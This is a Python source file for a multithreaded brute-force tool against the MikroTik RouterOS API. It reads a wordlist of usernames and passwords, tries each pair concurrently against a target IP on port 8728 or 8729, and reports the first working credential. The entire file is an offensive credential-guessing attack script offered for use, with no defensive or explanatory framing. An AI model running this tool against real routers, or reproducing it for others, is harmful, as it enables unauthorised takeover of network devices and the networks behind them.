#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Version: 1.4

import sys
import socket
import ssl
import time
import argparse
import platform
import threading
import concurrent.futures
from datetime import datetime

try:
    from _cli_ui import CLIInterface, print_banner
except Exception as e:
    CLIInterface = None
    def print_banner():
        print("\n[INFO] CLI UI not available.")

try:
    from _api import Api
except ModuleNotFoundError:
    raise ImportError("[ERROR] Module '_api' not found. Make sure the _api.py file is present in the same directory as this tool.")

try:
    from _log import Log
except ModuleNotFoundError:
    raise ImportError("[ERROR] Module '_log' not found. Make sure the _log.py file is present in the same directory as this tool.")

def current_time():
    return datetime.now().strftime("%H:%M:%S")

class Bruteforce:
    def __init__(self, target, port, wordlist_path, delay, use_ssl=False, ui=None, max_workers=5):
        self.target = target
        self.port = port
        self.delay = delay
        self.wordlist_path = wordlist_path
        self.use_ssl = use_ssl
        self.ui = ui
        self.max_workers = max_workers
        self.wordlist = []
        self.log = Log(True, None, None)
        self.load_wordlist()
        self.stop_flag = threading.Event()

    def load_wordlist(self):
        try:
            with open(self.wordlist_path, 'r', encoding='utf-8') as f:
                self.wordlist = [line.strip().split(':') for line in f if line.strip()]
        except Exception as e:
            self.log.error(f"[{current_time()}] Error loading wordlist: {e}")
            exit(1)

    def attempt_login(self, index, user, password):
        if self.stop_flag.is_set():
            return
        try:
            api = Api(self.target, self.port, use_ssl=self.use_ssl)
            if self.ui and self.ui.enabled:
                self.ui.update(attempt=index + 1, last_password=password, username=user)
            if api.login(user, password):
                self.log.success(f"[{current_time()}] [+] Success! User: {user} Password: {password}")
                if self.ui and self.ui.enabled:
                    self.ui.update(success=f"User: {user} | Pass: {password}", status="Success")
                self.stop_flag.set()
            else:
                self.log.info(f"[{current_time()}] [-] Attempt {index + 1}/{len(self.wordlist)} - Incorrect password: {password}")
        except Exception as e:
            self.log.warning(f"[{current_time()}] Error trying password '{password}': {e}")

        time.sleep(self.delay)

    def run(self):
        if self.ui and self.ui.enabled:
            try:
                if threading.current_thread() is threading.main_thread():
                    self.ui.update(status="Running", total=len(self.wordlist))
                    self.ui.start()
                else:
                    raise RuntimeError("UI must be initialized from the main thread.")
            except Exception as e:
                self.log.error(f"[{current_time()}] CLI UI failed to initialize: {e}")
                self.ui = None

        self.log.info(f"[{current_time()}] [*] Starting brute force attack...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for index, creds in enumerate(self.wordlist):
                if self.stop_flag.is_set():
                    break
                user = creds[0] if len(creds) > 1 else args.user
                password = creds[1] if len(creds) > 1 else creds[0]
                futures.append(executor.submit(self.attempt_login, index, user, password))
            for future in concurrent.futures.as_completed(futures):
                if self.stop_flag.is_set():
                    break

        self.log.info(f"[{current_time()}] [*] Attack finished.")
        if self.ui and self.ui.enabled:
            self.ui.stop()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Mikrotik API Brute Force Tool")
    parser.add_argument("-t", "--target", required=True, help="Mikrotik IP address")
    parser.add_argument("-p", "--port", type=int, default=8728, help="API port (default: 8728)")
    parser.add_argument("-u", "--user", default="admin", help="Username (default: admin)")
    parser.add_argument("-d", "--dictionary", required=True, help="Path to the password wordlist")
    parser.add_argument("-s", "--seconds", type=int, default=1, help="Delay between attempts (default: 1s)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL connection (port 8729)")
    parser.add_argument("--ui", action="store_true", help="Enable interactive CLI interface")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    args = parser.parse_args()

    if not args.ui:
        print_banner()

    enable_ui = args.ui and platform.system().lower() in ["linux", "darwin", "windows"] and CLIInterface is not None
    ui = CLIInterface(enabled=enable_ui) if enable_ui else None

    bf = Bruteforce(
        target=args.target,
        port=args.port,
        wordlist_path=args.dictionary,
        delay=args.seconds,
        use_ssl=args.ssl,
        ui=ui,
        max_workers=args.threads
    )

    try:
        bf.run()
    except KeyboardInterrupt:
        if ui and ui.enabled:
            ui.stop()
        print(f"\n[{current_time()}] [!] Attack interrupted by user. Exiting cleanly.\n")
